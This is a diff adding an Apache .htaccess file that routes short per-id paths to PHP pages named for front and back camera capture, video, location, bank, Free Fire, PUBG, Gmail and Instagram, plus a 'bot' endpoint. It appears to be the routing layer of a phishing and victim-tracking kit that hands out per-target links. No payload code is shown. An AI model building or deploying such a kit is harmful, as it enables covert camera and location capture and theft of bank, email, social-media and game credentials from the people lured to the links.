@@ -1,0 +1,16 @@
+RewriteEngine On
+RewriteBase /
+
+RewriteRule ^$ index.php [L]
+RewriteRule ^bot$ index.php [L]
+
+RewriteRule ^rm/([0-9]+)/?$ old_kamera.php?id=$1 [L,QSA]
+RewriteRule ^rc/([0-9]+)/?$ orqa_kamera.php?id=$1 [L,QSA]
+RewriteRule ^vd/([0-9]+)/?$ old_video.php?id=$1 [L,QSA]
+RewriteRule ^bc/([0-9]+)/?$ orqa_video.php?id=$1 [L,QSA]
+RewriteRule ^lk/([0-9]+)/?$ lokatsiya.php?id=$1 [L,QSA]
+RewriteRule ^bk/([0-9]+)/?$ bank.php?id=$1 [L,QSA]
+RewriteRule ^ff/([0-9]+)/?$ freefire.php?id=$1 [L,QSA]
+RewriteRule ^pg/([0-9]+)/?$ pubg.php?id=$1 [L,QSA]
+RewriteRule ^gm/([0-9]+)/?$ gmail.php?id=$1 [L,QSA]
+RewriteRule ^ig/([0-9]+)/?$ instagram.php?id=$1 [L,QSA]
